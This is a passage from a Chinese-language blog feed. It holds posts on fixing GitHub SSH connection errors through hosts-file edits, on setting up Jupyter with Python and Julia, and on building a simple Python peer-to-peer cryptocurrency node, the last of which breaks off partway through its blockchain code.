<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>通过生成新的SSH公钥可以解决大部分问题，但是还存在其他问题如生成新的SSH公钥后一小会可以成功上传，但是过了一段时间发现又出现了这个问题，就很无奈。为此只能继续看错误报告，突然发现为什么连接远程主机时，服务器访问的地址是20.248.137.48，去查询了一下发现是HK香港的地址，但是本人是在中国大陆访问的，想到了可能是因为开了vpn使用的香港的节点，后来改成美国的节点也发现自己的登录地点成了美国的ip，关掉vpn也可能解决这个问题，但是本人还是会报错表示远程主机被关闭，连接被重置。<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225171453294.png" alt="image-20230225171453294"></p>
<h3 id="访问地址映射"><a href="#访问地址映射" class="headerlink" title="访问地址映射"></a>访问地址映射</h3><p>既然报错一直都是远程主机被关闭，我们试着ping一下那个ip<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225171332261.png" alt="image-20230225171332261"><br>果然ping不通，那就换一个思路github服务器这么多我们干嘛非要找准一个死磕，找个ip地址工具，查一下github.com都有什么ip<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225171643660.png" alt="image-20230225171643660"><br>这样一看中国区域是指定不行了，看看其他的ip<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225171732264.png" alt="image-20230225171732264"><br>可以看到一共查到了这么多ip，看一下具体情况<br>如报错一直提到的20.248.137.48，访问的是澳洲那边的，很明显超时，怪不得主机一直被关闭。<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225171926851.png" alt="image-20230225171914330"></p>
<p>其他的<img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225171812706.png" alt="image-20230225171812706"><br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225172050026.png" alt="image-20230225172050026"><br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225172107193.png" alt="image-20230225172107193"></p>
<p>然后我们试着去ping一下这些ip，会发现<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225172300989.png" alt="image-20230225172300989"><br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225172339468.png" alt="image-20230225172339468"><br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225173052873.png" alt="image-20230225173052873"></p>
<p>注意：可以看到一部分ip是ping不通的，但是也有一部分是ping的通的，但不是所有的可以ping通的ip都可以使用，所以分为三种情况：</p>
<ol>
<li>140.82.121.3可以ping通，但是通过浏览器直接访问却是[无法加载]</li>
<li>192.30.255.113可以ping通，浏览器直接访问也可以显示github首页</li>
<li>20.205.243.166无法ping通，属于无法通信</li>
</ol>
<p>所以，我们需要的github对应的ip地址是第二种，这个需要一个一个试。</p>
<p>然后就是更改hosts文件来定向访问域名了</p>
<h4 id="windows更改hosts文件"><a href="#windows更改hosts文件" class="headerlink" title="windows更改hosts文件"></a>windows更改hosts文件</h4><ol>
<li>win+x打开终端(管理员)（不然权限不够），输入notepad打开记事本<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225172526153.png" alt="image-20230225172526153"></li>
<li>记事本左上角文件-打开文件-地址为C:\Windows\System32\drivers\etc，右下角将文本文档更换成所有文件<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225172734481.png" alt="image-20230225172734481"></li>
<li>在文章任意位置加上ip地址 url地址，如：<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225172846968.png" alt="image-20230225172846968"></li>
<li>然后刷新网络DNS缓存，注：DNS劫持中也是删除host文件来刷新DNS缓存使得通过域名访问到了攻击者的ip地址下。<br><code>ipconfig /flushdns</code></li>
</ol>
<p>实现到这一步应该就已经解决99.999%的问题了。<br><img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225173803085.png" alt="image-20230225173803085"></p>
<h3 id="意料之外的情况"><a href="#意料之外的情况" class="headerlink" title="意料之外的情况"></a>意料之外的情况</h3><p>如果你在设置ssh时没有设置名字，服务器可能会询问是否确认建立连接，直接enter似乎默认是no，输入yes就ok了<img src="/2023/02/25/github-ssh%E9%94%99%E8%AF%AF/image-20230225173933029.png" alt="image-20230225173933029"></p>
]]></content>
      <categories>
        <category>实例</category>
      </categories>
      <tags>
        <tag>错误处理</tag>
      </tags>
  </entry>
  <entry>
    <title>julia、python配套工具——jupyter</title>
    <url>/2023/02/17/jupyter/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>使用于python、julia的一个实用桌面工具</p>
<span id="more"></span>
<h2 id="安装Anaconda3"><a href="#安装Anaconda3" class="headerlink" title="安装Anaconda3"></a>安装Anaconda3</h2><p>从清华tuna镜像网站<a href="https://mirror.tuna.tsinghua.edu.cn/help/anaconda/下载Anaconda3最新版安装程序">https://mirror.tuna.tsinghua.edu.cn/help/anaconda/下载Anaconda3最新版安装程序</a></p>
<p>在Anaconda命令行中设置从tuna镜像更新anaconda组成部分：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">conda<span class="built_in"> config </span>--<span class="built_in">set</span> show_channel_urls <span class="literal">yes</span></span><br></pre></td></tr></table></figure>
<p>这会在<code>C:\Users\user</code>(其中user要替换成自己的用户名)生成.condarc文件，然后修改其内容为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">channels:</span><br><span class="line">  - defaults</span><br><span class="line">show_channel_urls: true</span><br><span class="line">default_channels:</span><br><span class="line">  - https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs/main</span><br><span class="line">  - https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs/r</span><br><span class="line">  - https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>pkgs/msys2</span><br><span class="line">custom_channels:</span><br><span class="line">  conda-forge: https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud</span><br><span class="line">  msys2: https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud</span><br><span class="line">  bioconda: https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud</span><br><span class="line">  menpo: https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud</span><br><span class="line">  pytorch: https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud</span><br><span class="line">  simpleitk: https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/anaconda/</span>cloud</span><br></pre></td></tr></table></figure>
<h2 id="Jupter安装和使用"><a href="#Jupter安装和使用" class="headerlink" title="Jupter安装和使用"></a>Jupter安装和使用</h2><p>从Anaconda3程序组中启动jupyter就可以运行python语言笔记本</p>
<h2 id="安装julia命令行程序"><a href="#安装julia命令行程序" class="headerlink" title="安装julia命令行程序"></a>安装julia命令行程序</h2><p>在anaconda命令行中使用where命令找到python和jupyter软件的安装位置<br><img src="/2023/02/17/jupyter/image-20230217184232746.png" alt="image-20230217184232746"></p>
<p>在Julia中，先设置Python和Jupyter的位置，然后安装和构建IJulia：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="type">ENV</span>[<span class="string">&quot;PYTHON&quot;</span>] <span class="operator">=</span> <span class="string">&quot;C:<span class="subst">\\</span>Anaconda3<span class="subst">\\</span>python.exe&quot;</span></span><br><span class="line"><span class="type">ENV</span>[<span class="string">&quot;JUPYTER&quot;</span>] <span class="operator">=</span> <span class="string">&quot;C:<span class="subst">\\</span>Anaconda3<span class="subst">\\</span>Scripts<span class="subst">\\</span>jupyter.exe&quot;</span></span><br><span class="line"><span class="keyword">import</span> Pkg</span><br><span class="line"><span class="type">Pkg</span>.add(<span class="string">&quot;IJulia&quot;</span>)</span><br><span class="line"></span><br><span class="line">如果出错，可以运行</span><br><span class="line"><span class="type">Pkg</span>.build(<span class="string">&quot;IJulia&quot;</span>)</span><br><span class="line"></span><br><span class="line">启动jupyter命令</span><br><span class="line">jupyter lab</span><br></pre></td></tr></table></figure>
<p>lab界面与tree界面</p>
<p><img src="/2023/02/17/jupyter/image-20230217184543462.png" alt="image-20230217184543462"></p>
<p><img src="/2023/02/17/jupyter/image-20230217185054567.png" alt="image-20230217185054567"></p>
<h2 id="Jupyter用法"><a href="#Jupyter用法" class="headerlink" title="Jupyter用法"></a>Jupyter用法</h2><h3 id="命令行模式下用法"><a href="#命令行模式下用法" class="headerlink" title="命令行模式下用法"></a>命令行模式下用法</h3><p>(1) 查看jupyter notebook的相关帮助</p>
<ul>
<li>jupyter notebook —help</li>
<li>jupyter notebook —help-all (更详细的信息)</li>
<li>jupyter notebook -h</li>
</ul>
<p>(2) 常用子命令——subcommand</p>
<ul>
<li>list:列出当前的所打开的jupyter notebook的一些信息<br><img src="/2023/02/17/jupyter/image-20230217190110355.png" alt="image-20230217190110355"></li>
<li>stop:关闭所给定的端口号的那个jupyter<br><img src="/2023/02/17/jupyter/image-20230217190224836.png" alt="image-20230217190224836"><br><img src="/2023/02/17/jupyter/image-20230217190257935.png" alt="image-20230217190257935"><br>可以看到页面已经报错了</li>
<li>password:给某一个打开的jupyter notebook服务设置密码</li>
</ul>
<p>(3) jupyter notebook命令的常用选项</p>
<ul>
<li><p>jupyter notebook —help-all 查看jupyter命令的详细信息： </p>
</li>
<li><p>—generate-config  产生默认的配置文件()这个是重点，后面会讲到）<br><img src="/2023/02/17/jupyter/image-20230217190922411.png" alt="image-20230217190922411"></p>
<p><img src="/2023/02/17/jupyter/image-20230217190936316.png" alt="image-20230217190936316"></p>
</li>
<li><p>—no-browser 启动jupyter notebook之后不打开浏览器（默认情况下是会打开一个浏览器界面的）<br><img src="/2023/02/17/jupyter/image-20230217191206740.png" alt="image-20230217191206740"></p>
</li>
<li><p>—pylab 在jupyter notebook里面集成，也可以在jupyter notebook里面使用</p>
<pre><code>      %pylab 或者是%matplotlib魔术命令（这是最常用的，后面也会讲到）
</code></pre></li>
<li><p>—config=<Unicode>  制定一个完全路径的配置文件名称，关于配置文件后面会详解，默认是default，即系统指定的默认配置文件</Unicode></p>
</li>
<li><p>—ip=<Unicode>  默认是: ‘localhost’，从前面的现实中也可以看出来，表示的是notebook服务器会监听的IP地址，我们也可以手动指定<br>—port=<Int>  指定jupyter notebook打开浏览器的端口号，默认是: 8888，也可以手动输入</Int></Unicode></p>
</li>
<li><p>—notebook-dir=<Unicode> 默认使用默认的目录，表示的是notebook和kernels的目录</Unicode></p>
</li>
<li><p>—browser=<Unicode> 还可以指定某一个特定的浏览器打开，默认使用系统默认的浏览器打开，是可以自己选定浏览器的。</Unicode></p>
</li>
</ul>
<h3 id="更改配置文件"><a href="#更改配置文件" class="headerlink" title="更改配置文件"></a>更改配置文件</h3><p>在配置文件中此位置更改笔记本目录<img src="/2023/02/17/jupyter/image-20230217191710192.png" alt="image-20230217191710192"><br>可以看到：Serving notebooks from local directory: C:\julia_work<br><img src="/2023/02/17/jupyter/image-20230217191908628.png" alt="image-20230217191908628"></p>
<h3 id="可视化界面的使用"><a href="#可视化界面的使用" class="headerlink" title="可视化界面的使用"></a>可视化界面的使用</h3><p><img src="/2023/02/17/jupyter/image-20230217192103988.png" alt="image-20230217192103988"></p>
<p>julia，表示julia kernel<br>python3，表示python3 kernel<br>text file，表示新建一个文本文件<br>folder，表示新建一个文件夹<br>terminal，表示在浏览器中新建一个用户终端</p>
<h3 id="文件类型的转换"><a href="#文件类型的转换" class="headerlink" title="文件类型的转换"></a>文件类型的转换</h3><p>test.ipynb<br><img src="/2023/02/17/jupyter/image-20230217220148922.png" alt="image-20230217220148922"><br>转换为docx<br><img src="/2023/02/17/jupyter/image-20230217215956130.png" alt="image-20230217215956130"><br><img src="/2023/02/17/jupyter/image-20230217220023831.png" alt="image-20230217220023831"><br>转换为html<br><img src="/2023/02/17/jupyter/image-20230217220048227.png" alt="image-20230217220048227"><br><img src="/2023/02/17/jupyter/image-20230217215844605.png" alt="image-20230217215844605" style="zoom:50%;"></p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>transactional_node</title>
    <url>/2023/02/07/transactional-node/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="/2023/02/07/transactional-node/image-20230224194527625.png" alt="image-20230224194527625"></p>
<span id="more"></span>
<p>要获得成熟的加密货币，我们区块链中的数据必须是<em>交易</em>。每笔交易都将硬币的所有权从一个私钥转移到另一个私钥。交易被收集在每个区块中并<em>开采</em>，从而发展区块链;事实上，一个区块越老，它的确定性就越高——它更有可能成为事实上的区块链的一部分。在任何时候，矿工都在忙于挖掘包含不同交易的略有不同的区块——这是一场寻找区块的竞赛——当矿工找到一个区块时，他们广播它，其余的矿工放弃他们当前的区块（他们已经输掉了比赛）并继续下一个区块。这些“丢弃”的块通常称为孤立块。</p>
<h3 id="The-role-of-a-miner"><a href="#The-role-of-a-miner" class="headerlink" title="The role of a miner"></a>The role of a miner</h3><p>矿工的作用是通过为区块找到合适的哈希来生成新的硬币。在挖矿时，矿工在一个池中收集传入的交易——在比特币中称为内存池——等待包含在后续区块中。如果交易太多而无法填充一个区块，那么矿工会选择费用最高的交易来增加利润。在2017年加密货币繁荣期间，由于备份了多少笔交易，比特币交易的价格超过了40美元。扩展比特币的主题通常包括内存池和交易费用，最值得注意的是区块大小的问题：我们应该在一个区块中存储多少笔交易？在比特币中，限额为1兆字节，平均约为1700笔交易。</p>
<h3 id="如何实施交易"><a href="#如何实施交易" class="headerlink" title="如何实施交易"></a>如何实施交易</h3><p>对funcoin节点进行一些更改;具体来说，必须弄清楚交易如何在网络中传播。p2p网络的结构方式对于加密货币的可靠性至关重要。比特币被认为是一个“推送”网络：节点不是向对等方查询新交易，而是在收到新交易时将新交易<em>推送</em>给所有对等方。粗略地说，当一个新节点加入网络时，它应该会产生<em>一种八卦</em>效应，让对等节点的对等节点了解它的存在，并可以可靠地向其发送未来的交易。</p>
<p>事务的数据结构</p>
<ol>
<li>发件人的公钥</li>
<li>收件人的公钥</li>
<li>转账金额</li>
<li>广告费用</li>
</ol>
<p><img src="/2023/02/07/transactional-node/image-20230207174409374.png" alt="image-20230207174409374"></p>
<p>为了发送或接收funcoins，我们需要生成一个钱包——一个公钥-私钥对。要向Beatrix发送funcoins，Aldo必须创建一个包含他和Beatrix的<strong>公钥</strong>以及要发送的金额的交易。然后使用 Aldo 的<strong>私钥</strong>对交易进行签名。</p>
<p>网络中的任何对等方都可以通过检查 Aldo 的公钥来验证交易的真实性。如果交易通过验证，那么当矿工包含它时，它将被添加到区块链中。</p>
<p>构建节点所需的所有原子单元：</p>
<ul>
<li>用于维护不可变数据链的区块链</li>
<li>允许客户端来回连接和发送数据的服务器</li>
<li>一种用于创建新funcoin的挖掘算法</li>
<li>密码学基础知识，使我们能够验证和构建交易</li>
</ul>
<p>相关依赖作用</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>库</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Structlog</td>
<td>日志记录库（优于print()语句）</td>
</tr>
<tr>
<td>Colorama</td>
<td>允许彩色输出（在日志记录中）</td>
</tr>
<tr>
<td>Marshmallow</td>
<td>验证数据结构，例如节点将发送和接收的JSON消息</td>
</tr>
<tr>
<td>marshmallow-oneofschema</td>
<td>允许marshmallow验证更复杂的数据结构</td>
</tr>
<tr>
<td>Aiohttp</td>
<td>异步HTTP客户端</td>
</tr>
<tr>
<td>Pynacl</td>
<td>签署和验证交易</td>
</tr>
</tbody>
</table>
</div>
<p>创建文件结构</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">PS C:\Users\榎鸢\Desktop\funcoin&gt; touch node<span class="selector-class">.py</span></span><br><span class="line">Touching node<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin&gt; mkdir funcoin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\榎鸢\Desktop\funcoin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----          <span class="number">2023</span>/<span class="number">2</span>/<span class="number">7</span>     <span class="number">18</span>:<span class="number">11</span>                funcoin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin&gt; cd funcoin</span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch __init__<span class="selector-class">.py</span></span><br><span class="line">Touching __init__<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch blockchain<span class="selector-class">.py</span></span><br><span class="line">Touching blockchain<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch connections<span class="selector-class">.py</span></span><br><span class="line">Touching connections<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch transactions<span class="selector-class">.py</span></span><br><span class="line">Touching transactions<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch server<span class="selector-class">.py</span></span><br><span class="line">Touching server<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch types<span class="selector-class">.py</span></span><br><span class="line">Touching types<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch messages<span class="selector-class">.py</span></span><br><span class="line">Touching messages<span class="selector-class">.py</span></span><br><span class="line">PS C:\Users\榎鸢\Desktop\funcoin\funcoin&gt; touch utils<span class="selector-class">.py</span></span><br><span class="line">Touching utils.py</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/07/transactional-node/image-20230207181758540.png" alt="image-20230207181758540"></p>
<p>构建节点</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>模块</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Blockchain</td>
<td>容纳区块链类</td>
</tr>
<tr>
<td>ConnectioPool</td>
<td>处理对等方可能发送给我们的消息传播的逻辑。称之为P2PProtocol</td>
</tr>
<tr>
<td>P2PProtocol</td>
<td>处理与节点通信的活动连接”池“的逻辑</td>
</tr>
<tr>
<td>Server</td>
<td>基本TCP服务器所在的位置</td>
</tr>
</tbody>
</table>
</div>
<p>node.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> funcoin.blockchain <span class="keyword">import</span> Blockchain</span><br><span class="line"><span class="keyword">from</span> funcoin.connections <span class="keyword">import</span> ConnectionPool</span><br><span class="line"><span class="keyword">from</span> funcoin.peers <span class="keyword">import</span> P2PProtocol</span><br><span class="line"><span class="keyword">from</span> funcoin.server <span class="keyword">import</span> Server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化区块链和对等节点池</span></span><br><span class="line">blockchain = Blockchain()</span><br><span class="line">connection_pool = ConnectionPool()</span><br><span class="line"><span class="comment"># 实例化服务器并”附加“模块</span></span><br><span class="line">server = Server(blockchain,connection_pool,P2PProtocol)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 启动服务器</span></span><br><span class="line">    <span class="keyword">await</span> server.listen()</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
<p>因为使用asyncio采用异步的方式而非线程，所以大大简化了并发问题：当使用线程时，程序员需要担心竞争条件（两个或多个线程竞争更新或接收某些内容）。这种方法的缺点时代码可能变得难以阅读和理解。</p>
<p>代码中的入口点有一个函数mian()。典型的异步程序，它用于启动我们的服务器。</p>
<h2 id="服务器模块"><a href="#服务器模块" class="headerlink" title="服务器模块"></a>服务器模块</h2><p>server.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> asyncio <span class="keyword">import</span> StreamReader,StreamWriter</span><br><span class="line"><span class="keyword">import</span> structlog</span><br><span class="line"><span class="keyword">from</span> marshmallow.exceptions <span class="keyword">import</span> MarshmallowError</span><br><span class="line"><span class="keyword">from</span> funcoin.messages <span class="keyword">import</span> BaseSchema</span><br><span class="line"><span class="keyword">from</span> funcoin.utils <span class="keyword">import</span> get_external_ip</span><br><span class="line"></span><br><span class="line">logger = structlog.getLogger() <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Server</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,blockchain,connection_pool,p2p_protocol</span>):</span><br><span class="line">        self.blockchian = blockchain <span class="comment"># 2</span></span><br><span class="line">        self.connection_pool = connection_pool</span><br><span class="line">        self.p2p_protocol = p2p_protocol</span><br><span class="line">        self.external_ip = <span class="literal">None</span></span><br><span class="line">        self.external_port = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (blockchain <span class="keyword">and</span> connection_pool <span class="keyword">and</span> p2p_protocol):</span><br><span class="line">            logger.error(<span class="string">&quot;&#x27;blockchain&#x27;,&#x27;connection_pool&#x27;,and&#x27;gossip_protocol&#x27; must all be instantiated&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not start&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_external_ip</span>(<span class="params">self</span>):</span><br><span class="line">        self.external_ip = <span class="keyword">await</span> get_external_ip() <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">self,reader:StreamReader,writer:StreamWriter</span>):</span><br><span class="line">        <span class="comment"># 当收到新连接时调用此函数</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 一直等待新数据到达</span></span><br><span class="line">                data = <span class="keyword">await</span> reader.readuntil(<span class="string">b&quot;\n&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">                decoded_data = data.decode(<span class="string">&quot;utf8&quot;</span>).strip() <span class="comment"># 5</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    message = BaseSchema().loads(decoded_data) <span class="comment"># 6</span></span><br><span class="line">                <span class="keyword">except</span> MarshmallowError:</span><br><span class="line">                    logger.info(<span class="string">&quot;Received unreadable message&quot;</span>,peer=writer)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                writer.address = message[<span class="string">&quot;meta&quot;</span>][<span class="string">&quot;address&quot;</span>]</span><br><span class="line"></span><br><span class="line">                self.connection_pool.add_peer(writer)</span><br><span class="line">                <span class="keyword">await</span> self.p2p_protocol.handle_message(message,writer) <span class="comment"># 7</span></span><br><span class="line">                <span class="keyword">await</span> writer.drain()</span><br><span class="line">                <span class="keyword">if</span> writer.is_closing():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> (asyncio.exceptions.IncompleteReadError,ConnectionError):</span><br><span class="line">                <span class="comment"># 发生错误，脱离等待循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        writer.close()</span><br><span class="line">        <span class="keyword">await</span> writer.wait_closed()</span><br><span class="line">        self.connection_pool.remove_peer(writer) <span class="comment"># 8</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">listen</span>(<span class="params">self,hostname=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span></span>):</span><br><span class="line">        <span class="comment"># 这是生成服务器的监听方法</span></span><br><span class="line">        server = <span class="keyword">await</span> asyncio.start_server(self.handle_connection,hostname,port)</span><br><span class="line">        logger.info(<span class="string">f&quot;Server listening on <span class="subst">&#123;hostname&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">        self.external_ip = <span class="keyword">await</span> self.get_external_ip()</span><br><span class="line">        self.external_port = <span class="number">8888</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> server:</span><br><span class="line">            <span class="keyword">await</span> server.serve_forever()    </span><br></pre></td></tr></table></figure>
<p>(1) 注意结构日志的导入和使用——使用它来替换print()语句。当运行整个节点时，他会为控制台提供高度可读的输出。eg：他会告诉您日志来自哪个文件</p>
<p>(2) 将模块“引导”到服务器：服务器类（以及附加到它的任何内容）将始终可以通过self.blockchain访问我们的区块链。</p>
<p>(3) 虽然我们还没有实现get_external_ip（），但它负责查找我们的外部IP地址。</p>
<p>(4) 在这里，被设置为<em>永远</em>等待，直到一条消息发送给服务器，并以换行符（\n）结尾。这是一些潜在漏洞中的第一个，因为任何人都可以向我们的服务器发送永无止境的消息。</p>
<p>(5) 我们尝试通过假设消息作为 UTF-8 格式的字符串发送给我们来解码消息。</p>
<p>(6) 使用marshmallow来解析和验证来自对等方的传入消息</p>
<p>(7) 一旦消息被成功解析，进一步的代码可以假设所有相关字段都存在，接下来通过p2p协议来确定怎么做</p>
<h2 id="blockchain模块"><a href="#blockchain模块" class="headerlink" title="blockchain模块"></a>blockchain模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> structlog</span><br><span class="line"></span><br><span class="line">logger = structlog.getLogger(<span class="string">&quot;blockchain&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Blockchain</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        self.chain = []</span><br><span class="line">        self.pending_transactions = []</span><br><span class="line">        self.target = <span class="string">&quot;0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;</span></span><br><span class="line"></span><br><span class="line">        logger.info(<span class="string">&quot;Creating genesis block&quot;</span>)</span><br><span class="line">        self.chain.append(self.new_block())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_block</span>(<span class="params">self</span>):</span><br><span class="line">        block = self.create_block(</span><br><span class="line">            height=<span class="built_in">len</span>(self.chain),</span><br><span class="line">            transactions=self.pending_transactions,</span><br><span class="line">            previous_hash=self.last_block[<span class="string">&quot;hash&quot;</span>] <span class="keyword">if</span> self.last_block <span class="keyword">else</span> <span class="literal">None</span>,</span><br><span class="line">            nonce=<span class="built_in">format</span>(random.getrandbits(<span class="number">64</span>), <span class="string">&quot;x&quot;</span>),</span><br><span class="line">            target=self.target,</span><br><span class="line">            timestamp=time(),</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.pending_transactions = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_block</span>(<span class="params">height,transactions,previous_hash,nonce,target,timestamp=<span class="literal">None</span></span>):</span><br><span class="line">        block = &#123;</span><br><span class="line">            <span class="string">&quot;height&quot;</span>:height,</span><br><span class="line">            <span class="string">&quot;transactions&quot;</span>:transactions,</span><br><span class="line">            <span class="string">&quot;previous_hash&quot;</span>:previous_hash,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>:nonce,</span><br><span class="line">            <span class="string">&quot;target&quot;</span>:target,</span><br><span class="line">            <span class="string">&quot;timestamp&quot;</span>:timestamp <span class="keyword">or</span> time()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        block_string = json.dumps(block,sort_keys=<span class="literal">True</span>).encode()</span><br><span class="line">        block[<span class="string">&quot;hash&quot;</span>] = sha256(block_string).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod    </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">block</span>):</span><br><span class="line">        block_string = json.dumps(block,sort_keys=<span class="literal">True</span>).encode()</span><br><span class="line">        <span class="keyword">return</span> sha256(block_string).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">last_block</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.chain[-<span class="number">1</span>] 